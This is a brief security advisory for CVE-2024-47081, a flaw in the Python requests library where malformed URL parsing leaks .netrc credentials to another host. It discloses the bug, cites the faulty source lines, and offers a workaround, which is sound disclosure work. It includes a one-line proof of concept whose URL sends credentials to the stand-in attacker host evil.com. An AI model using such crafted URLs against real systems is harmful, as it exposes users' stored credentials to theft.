# CVE-2024-47081: Netrc credential leak in PSF requests library

```
The PSF requests library (https://github.com/psf/requests & https://pypi.org/project/requests/) leaks .netrc
credentials to third parties due to incorrect URL processing under specific conditions.

Issuing the following API call triggers the vulnerability:

  requests.get('http://example.com:@evil.com/';)

Assuming .netrc credentials are configured for example.com, they are leaked to evil.com by the call.

The root cause is
https://github.com/psf/requests/blob/c65c780849563c891f35ffc98d3198b71011c012/src/requests/utils.py#L240-L245

The vulnerability was originally reported to the library maintainers on September 12, 2024, but no fix is available.
CVE-2024-47081 has been reserved by GitHub for this issue.

As a workaround, clients may explicitly specify the credentials used on every API call to disable .netrc access.
